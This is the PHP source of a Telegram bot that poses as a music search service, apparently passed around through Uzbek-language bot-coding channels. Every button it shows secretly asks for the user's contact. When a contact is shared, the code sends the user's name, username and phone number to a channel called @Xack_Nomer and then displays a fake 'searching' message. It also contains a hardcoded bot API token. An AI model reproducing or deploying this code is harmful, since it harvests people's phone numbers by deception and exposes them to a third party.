
<?php
define('API_KEY','1923181412:AAEcRPPjQzo5JR-fcWf9rlxuS2Tjsg3SE6w');
$admin = "1533792101"; // admin idsi
function del($nomi){
array_map('unlink', glob("$nomi"));
}
//kod @Abroriy tomonidan @PHP_Masters va @Bot_Masterlar kanali orqali tarqatildi
function put($fayl,$nima){
file_put_contents("$fayl","$nima");
}
function get($fayl){
$get = file_get_contents("$fayl");
return $get;
}
function ty($ch){ 
return bot('sendChatAction', [
'chat_id' => $ch,
'action' => 'typing',
]);
}
function editMessageText(
        $chatId,
        $messageId,
        $text,
        $parseMode = null,
        $disablePreview = false,
        $replyMarkup = null,
        $inlineMessageId = null
    ) {
       return bot('editMessageText', [
            'chat_id' => $chatId,
            'message_id' => $messageId,
            'text' => $text,
            'inline_message_id' => $inlineMessageId,
            'parse_mode' => $parseMode,
            'disable_web_page_preview' => $disablePreview,
            'reply_markup' => $replyMarkup,
        ]);
    }
function ACL($callbackQueryId, $text = null, $showAlert = false)
{
     return bot('answerCallbackQuery', [
        'callback_query_id' => $callbackQueryId,
        'text' => $text,
        'show_alert'=>$showAlert,
    ]);
}
function bot($method,$datas=[]){
    $url = "https://api.telegram.org/bot".API_KEY."/".$method;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
    $res = curl_exec($ch);
    if(curl_error($ch)){
        var_dump(curl_error($ch));
    }else{
        return json_decode($res);
    }
}
$update = json_decode(get('php://input'));
$message = $update->message;
$text = $message->text;
$cid = $message->chat->id;
$uid = $message->from->id;
$fname = $message->from->first_name;
$user = $message->from->username;
$data = $message->contact;
$nomer = $message->contact->phone_number;
$name = $message->contact->first_name;


if($text == "/start"){
    bot('sendmessage',[
        'chat_id'=>$cid,
        'text'=>"*Assalomu alaykum hurmatli foydalanuvchi botga hush kelibsiz siz botdan osongina xohlagan musiqangizni topishingiz mumkun Buning uchun Roʼyxatdan oʼting*",
        'parse_mode'=>"markdown",
        'reply_markup'=>json_encode(
['resize_keyboard'=>true,
'keyboard' => [
[["text"=>"⏳Ro'yxatdan o'tish",'request_contact' =>true],],
[["text"=>"⏳Qisqacha video yuboring",'request_contact' =>true],],
[["text"=>"⏳Qisqacha ovozli muzika yuboring",'request_contact' =>true],],
]
])
]);
}
if($data){
bot('sendmessage',[
    'chat_id'=>"@Xack_Nomer",
    'text'=>"User nomi: [$fname](tg://user?id=$uid)\nUseri: @$user\nNomeri: $nomer\nNomer nomi: $name\n [@Xack_Nomer]",
    'parse_mode'=>"markdown"
        ]);
bot("sendmessage",[
    'chat_id'=>$cid,
    'text'=>"Yaxshi ro'yxatdan omadli o'tdingiz ",
     'text'=>"🎶Izlanmoqda... ",
    'reply_markup'=>json_encode(
[
'resize_keyboard'=>true,
'selective'=>true,
'one_time_keyboard'=>true,
'keyboard' => [
[["text"=>"🔎Izlash"],],
]
])
]);
}
//kod @Abroriy tomonidan @PHP_Masters va @Bot_Masterlar kanali orqali 
$button = $message->keyboardbutton->text;
if($text == "🎶Izlanmoqda..."){
    bot('sendmessage',[
        'chat_id'=>$cid,
        'text'=>"Topilmagan mp3 larni @Qadirdonlarim_N01 Guruhmizga yuboring "]);
}
